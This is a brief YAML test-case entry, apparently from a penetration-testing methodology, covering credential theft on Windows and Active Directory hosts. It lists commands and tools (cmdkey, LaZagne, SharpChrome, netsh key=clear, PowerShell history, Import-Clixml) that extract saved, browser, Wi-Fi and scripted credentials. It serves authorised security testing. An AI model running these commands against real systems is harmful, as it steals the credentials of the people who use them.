---
testcase: Commands and Tools for Credential Theft
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://attack.mitre.org/techniques/T1552/
how-to-test: |
  - List saved credentials:
    - `cmdkey /list`
  - Use LaZagne to extract credentials:
    - `.lazagne.exe all`
  - Steal browser passwords with tools like:
    - `SharpChrome.exe`
  - Extract wireless keys:
    - `netsh wlan show profile`
    - `netsh wlan show profile <SSID> key=clear`
  - Extract credentials from PowerShell history:
    - `gc (Get-PSReadLineOption).HistorySavePath`
  - Decrypt XML credentials:
    - `$credential = Import-Clixml -Path '<path>'`
---
